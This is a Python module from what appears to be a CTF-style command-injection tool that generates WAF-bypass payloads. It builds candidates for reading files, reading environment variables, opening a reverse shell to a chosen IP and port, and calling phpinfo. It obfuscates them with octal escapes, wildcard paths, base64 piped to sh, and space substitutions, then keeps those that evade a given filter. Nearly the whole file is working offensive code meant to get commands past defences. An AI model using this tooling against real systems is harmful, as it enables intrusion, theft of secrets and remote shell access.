from dataclasses import dataclass

from . import bypass_data
from . import utils


@dataclass
class BypassOptions:
    readfile: str
    read_env: bool
    reflect_shell: bool
    ip: str
    port: int
    phpinfo: bool


def _octal_encode(command: str):
    r"""
    将命令转换为 Linux 八进制转义格式 ($'\xxx\xxx')
    Convert command to Linux octal escape format ($'\xxx\xxx')
    """
    encoded = "".join(f"\\{oct(ord(c))[2:]}" for c in command)
    return f"$'{encoded}'"


def _wildcard_bypass(path: str):
    """
    使用通配符替换路径中的部分字符
    Replace characters in path with wildcards
    """
    if not path or path == "/":
        return path
    parts = path.split("/")
    new_parts = []
    for p in parts:
        if len(p) > 1:
            new_parts.append(p[0] + "?" * (len(p) - 1))
        else:
            new_parts.append(p)
    return "/".join(new_parts)


def _base64_pipe_bypass(command: str):
    """
    将命令转换为变量拼接 + Base64 管道执行格式
    Convert command to variable concatenation + Base64 pipe execution format
    Example: b=bas;c=e64;a=s;c=h;echo {b64}| $b$c -d| $a$c
    """
    import base64

    b64_cmd = base64.b64encode(command.encode()).decode()
    # 构造更贴合用户预期的格式
    # b=bas;c=e64;a=s;c=h; -> $b$c=base64, $a$c=sh
    return f"b=bas;c=e64;a=s;c=h;echo {b64_cmd}| $b$c -d| $a$c"


def generate_candidates(options: BypassOptions):
    payloads = []
    if options.readfile:
        for template in bypass_data.READFILE_TEMPLATES:
            # Original path
            payloads.append(template.format(path=options.readfile))
            # Wildcard path
            payloads.append(template.format(path=_wildcard_bypass(options.readfile)))

    if options.read_env:
        payloads.extend(bypass_data.READ_ENV_TEMPLATES)
    if options.reflect_shell:
        for template in bypass_data.REFLECT_SHELL_TEMPLATES:
            payloads.append(template.format(ip=options.ip, port=options.port))
    if options.phpinfo:
        payloads.extend(bypass_data.PHPINFO_TEMPLATES)

    # Apply Base64 pipe bypass to all payloads generated so far
    base_payloads = payloads.copy()
    for p in base_payloads:
        # Only apply to shell commands, not PHP snippets
        if ";" not in p and "(" not in p:
            payloads.append(_base64_pipe_bypass(p))

    # Apply octal encoding to simple commands
    simple_cmds = ["ls", "cat /flag", "tac /flag", "env"]
    for cmd in simple_cmds:
        payloads.append(_octal_encode(cmd))

    # Apply space bypasses
    candidates = payloads.copy()
    for p in payloads:
        if " " in p:
            for template in bypass_data.SPACE_BYPASS_TEMPLATES:
                candidates.append(template.format(payload=p))

    return utils.dedupe_preserve_order(candidates)


def apply_encodings(payloads, strategies):
    encoded = []
    for payload in payloads:
        for _name, encoder in strategies:
            try:
                encoded.append(encoder(payload))
            except Exception:
                continue
    return utils.dedupe_preserve_order(encoded)


def filter_payloads(
    payloads,
    waf_words,
    waf_chars,
    waf_regex,
    limit_length,
    show_progress=True,
    verbose=False,
):
    passed = []
    progress = ProgressBar(len(payloads), verbose=verbose) if show_progress else None
    for idx, payload in enumerate(payloads, start=1):
        if progress:
            progress.update(idx)
        if utils.is_payload_allowed(payload, waf_words, waf_chars, waf_regex, limit_length):
            passed.append(payload)
            if progress:
                progress.mark_pass(payload)
    if progress:
        progress.finish()
    return passed


class ProgressBar:
    def __init__(self, total, width=24, stream=None, verbose=False):
        self.total = max(int(total), 0)
        self.width = max(int(width), 5)
        self.stream = stream
        self.current = 0
        self.passed = 0
        self.verbose = verbose

    def update(self, current):
        self.current = current
        self._write_line()

    def mark_pass(self, payload):
        self.passed += 1
        if self.verbose:
            self._write_line(end="\n")
            self._write(f"PASS: {payload}\n")
        else:
            self._write_line()

    def finish(self):
        self.current = self.total
        self._write_line(end="\n")

    def _write_line(self, end=""):
        bar = self._render_bar()
        msg = f"\r{bar} {self.current}/{self.total} passed:{self.passed}"
        self._write(msg + end)

    def _render_bar(self):
        if self.total <= 0:
            filled = 0
        else:
            filled = int(self.width * (self.current / self.total))
        return "[" + ("=" * filled).ljust(self.width, ".") + "]"

    def _write(self, text):
        import sys

        stream = self.stream or sys.stdout
        stream.write(text)
        stream.flush()
